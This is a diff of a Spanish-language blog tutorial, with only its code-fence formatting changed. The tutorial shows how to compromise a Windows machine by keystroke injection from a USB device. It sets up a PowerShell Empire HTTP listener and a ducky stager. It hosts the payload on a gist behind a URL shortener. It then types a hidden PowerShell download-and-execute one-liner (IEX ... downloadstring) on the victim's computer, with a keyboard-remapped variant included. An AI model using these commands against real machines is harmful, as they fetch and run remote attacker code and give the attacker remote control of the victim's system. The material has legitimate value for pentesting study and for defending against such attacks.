@@ -38,27 +38,33 @@ Antes de poder seguir necesitaremos crear nuestro payload con Empire. En el sigu
 
 Primero de todo creamos nuestro listener:
 {: style="text-align: justify;"}
-´´´
+
+```
 uselistener http
-´´´
+```
+
 [![Empire](https://donttouchmynet.github.io/assets/images/old/Empire1-300x150.png)](https://donttouchmynet.github.io/assets/images/old/Empire1.png)
 
 Configuramos el puerto y la IP  en la que escuchará Empire:
 {: style="text-align: justify;"}
-´´´
+
+```
 set Host http://198.51.100.2:8081
 set Port 8081
-´´´
+```
+
 [![Empire](https://donttouchmynet.github.io/assets/images/old/Empire2-300x166.png)](https://donttouchmynet.github.io/assets/images/old/Empire2.png)
 
 Después de esto generamos nuestro payload:
 {: style="text-align: justify;"}
-´´´
+
+```
 back
 usestager windows/ducky
 set Listener http
 execute
-´´´
+```
+
 [![Empire](https://donttouchmynet.github.io/assets/images/old/Empire4-300x143.png)](https://donttouchmynet.github.io/assets/images/old/Empire4.png)
 
 Del payload obtenido la última línea será la que utilizaremos en nuestro ataque.
@@ -72,9 +78,10 @@ Podríamos injectar el payload obtenido directamente a través del USB, pero tra
 
 Por lo tanto, utilizaremos gist.github.com para guardar allí nuestro payload  y en el ordenador de la víctima llamaremos a Powershell para que lo descargue mediante un acortador de Google
 {: style="text-align: justify;"}
-´´´
+
+```
 powershell -w 1 -nop -noni -c «IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')»
-´´´
+```
 Por lo tanto, primero generamos nuestro gist.github.com con el payload:
 {: style="text-align: justify;"}
 
@@ -97,9 +104,9 @@ Substituimos ) por (
 
 Quedando por lo tanto la siguiente línea:
 {: style="text-align: justify;"}
-´´´
+```
 powershell /w 1 /nop /noni /c @IEX *New-Object Net.Webclient(.downloadstring*-https>&&goo.gl&XXXX-(@
-´´´
+```
 Donde XXXX es el link acortado de Google.
 
 Con esto ya podemos ejecutar nuestro ataque.
@@ -129,15 +136,15 @@ En esta lanzaremos nuestro ataque de forma sencilla.
 Pulsamos sobre el botón GUI+r
 
 escribiremos:
-´´´
+```
 PrintLine: powershell
-´´´
+```
 y haremos clic en Send Text+Enter
 
 Después de esto escribiremos:
-´´´
+```
 PrintLine: powershell /w 1 /nop /noni /c @IEX *New-Object Net.Webclient(.downloadstring*-https>&&goo.gl&XXXX-(@
-´´´
+```
 [![](https://donttouchmynet.github.io/assets/images/old/2018-02-17_18-34-49-300x131.png)](https://donttouchmynet.github.io/assets/images/old/2018-02-17_18-34-49.png)
 
 y haremos clic de nuevo en Send Text+Enter
